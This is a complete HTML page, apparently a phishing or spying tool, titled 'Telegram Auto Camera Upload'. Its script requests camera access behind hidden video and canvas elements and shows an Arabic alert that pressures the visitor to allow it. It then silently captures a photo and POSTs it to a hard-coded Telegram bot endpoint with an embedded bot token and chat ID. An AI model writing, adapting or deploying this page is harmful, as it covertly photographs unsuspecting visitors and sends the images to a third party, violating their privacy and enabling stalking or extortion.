<!DOCTYPE html>
<html>
<head>
  <title>Telegram Auto Camera Upload</title>
</head>
<body>
  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            captureAndSend();
          }, 1000); 
        };
      })
      .catch(error => {
        console.error('فشل الوصول للكاميرا:', error);
        alert('يجب السماح بالوصول للكاميرا لمتابعة العملية.');
      });

    function captureAndSend() {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', '1702324511'); // Chat ID الخاص بك
        formData.append('photo', blob, 'photo.png');

        fetch('https://api.telegram.org/bot7902247042:AAGhKg-93qflFaPHVrIa6QPwY3ruRVk5Fs4/sendPhoto', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {

        });
      }, 'image/png');
    }
  </script>
</body>
</html>
